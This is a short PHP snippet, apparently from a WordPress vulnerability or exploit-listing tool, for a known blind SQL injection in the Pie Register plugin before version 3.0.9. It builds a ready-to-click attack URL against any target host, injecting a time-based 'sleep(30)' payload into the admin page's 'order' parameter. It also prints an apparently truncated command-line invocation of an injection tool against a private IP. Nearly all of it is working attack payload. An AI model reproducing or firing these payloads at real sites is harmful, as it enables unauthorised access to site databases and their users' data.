<?php

  echo "<h3>WordPress Plugin Pie Register < 3.0.9 - Blind SQL Injection <span style=\"color:red;\">(auth needed)</span></h3>";
  echo "<a href=\"https://www.exploit-db.com/exploits/44867/\">https://www.exploit-db.com/exploits/44867/</a><br>";
  echo "<a href=\"http://".$url."/wp-admin/admin.php?page=pie-invitation-codes&orderby=name&order=desc%2c(select*from(select(sleep(30)))a)\">http://".$url."/wp-admin/admin.php?page=pie-invitation-codes&orderby=name&order=desc%2c(select*from(select(sleep(30)))a)</a>";
  echo "<p>.py -u \"http://192.168.0.43/wp496/wp-admin/admin.php?page=pie-invitation-codes&orderby=name&order=desc\" --cookie=\"\"</p>";
 ?>
